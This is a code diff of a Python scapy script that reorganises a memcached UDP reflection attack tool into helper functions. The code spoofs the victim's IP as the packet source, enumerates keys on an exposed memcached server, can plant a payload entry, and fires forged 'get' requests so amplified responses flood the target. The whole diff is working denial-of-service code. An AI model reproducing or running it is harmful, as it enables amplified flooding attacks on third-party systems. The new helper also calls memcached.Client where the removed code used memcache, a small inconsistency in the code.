@@ -31,6 +31,66 @@ from scapy.layers.inet import IP, UDP
 
 from scapy.all import sr1
 
+PACKET_BASE = '\x00\x00\x00\x00\x00\x01\x00\x00{0}\r\n'
+
+def get_keys_by_id(server, target):
+    """Function to retrieve all keys for
+    memcached server entries"""
+    try:
+        ip_packet = IP(src=target, dst=server)
+        # fetch known keys by id
+        statitems_packet = PACKET_BASE.format('stats items')
+        udp = UDP(sport=50000, dport=11211)/statitems_packet
+        keyids = []
+        resp = sr1(ip_packet/udp)
+        for key in str(resp.payload).split('\r\n'):
+            # Skip first line which has hex in it (I'm lazy)
+            if 'age' in key:
+                key = key.split(':')[1]
+                keyids.append(key)
+        return keyids
+    except Exception as error:
+        print str(error)
+        raise ValueError('Could not find memcached keys')
+
+def get_key_name_by_id(server, target, kid):
+    """Function to get key names by their id"""
+    try:
+        ip_packet = IP(src=target, dst=server)
+        keyid_packet = PACKET_BASE.format('stats cachedump {0} 100'.format(kid))
+        udp = UDP(sport=5000, dport=11211)/keyid_packet
+        resp = str(sr1(ip_packet/udp).payload).split('\r\n')
+        for key in resp:
+            if 'ITEM' in key:
+                res = re.match(r"(.*)ITEM (?P<keyname>\w+)(.*)", key)
+                return res.group('keyname')
+    except Exception as error:
+        print str(error)
+        raise IndexError('Could not find memcached key names')
+
+def set_memcached_payload(server, key, value):
+    """Function to optionally set data into an
+    entry in memcached for payload usage"""
+    try:
+        mc = memcached.Client([server], debug=False)
+        mc.set(key, value)
+        return True
+    except Exception as error:
+        print str(error)
+        raise ValueError('Could not set payload on memcached server')
+
+def fun_packet(server, target, key):
+    """The actual sauce"""
+    try:
+        ip_packet = IP(src=target, dst=server)
+        pkt = PACKET_BASE.format('get {0}'.format(key))
+        udp = UDP(sport=5000, dport=11211)/pkt
+        sr1(ip_packet/udp)
+        return True
+    except Exception as error:
+        print str(error)
+        raise EnvironmentError('Could not send the payload packet')
+
 def work_magic(server, target):
     """Function to perform payload 'offload'
     from vulnerable memcached server"""
@@ -41,44 +101,29 @@ def work_magic(server, target):
 
     try:
         ip_packet = IP(src=target, dst=server)
-        packet_base = '\x00\x00\x00\x00\x00\x01\x00\x00{0}\r\n'
 
         # fetch known keys by id
-        statitems_packet = packet_base.format('stats items')
-        udp = UDP(sport=50000, dport=11211)/statitems_packet
-        keyids = []
-        resp = sr1(ip_packet/udp)
-        for key in str(resp.payload).split('\r\n'):
-            # Skip first line which has hex in it (I'm lazy)
-            if 'age' in key:
-                key = key.split(':')[1]
-                keyids.append(key)
+        keyids = get_keys_by_id(server, target)
 
         # fetch names for keys by id
         keys = []
         for kid in keyids:
-            keyid_packet = packet_base.format('stats cachedump {0} 100'.format(kid))
-            udp = UDP(sport=50000, dport=11211)/keyid_packet
-            resp = str(sr1(ip_packet/udp).payload).split('\r\n')
-            for key in resp:
-                if 'ITEM' in key:
-                    res = re.match(r"(.*)ITEM (?P<keyname>\w+)(.*)", key)
-                    keys.append(res.group('keyname'))
+            keys.append(get_key_name_by_id(server, target, kid))
 
         # if keys not present on target, make one
         if not keys:
-            memcache.Client([server], debug=False).set(payload_key, payload)
-            keys.append(payload_key)
+            if set_memcached_payload(server, payload_key, payload):
+                keys.append(payload_key)
+            else:
+                raise ValueError('Could not find any keys to use')
 
         # iterate thru known keys and blast away
         for key in keys:
-            fun_packet = packet_base.format('get {0}'.format(key))
-            udp = UDP(sport=50000, dport=11211)/fun_packet
-            sr1(ip_packet/udp)
+            fun_packet(server, target, key)
 
         return True
-    except Exception as err:
-        raise
+    except Exception as error:
+        raise Exception(str(error))
 
 
 def main():
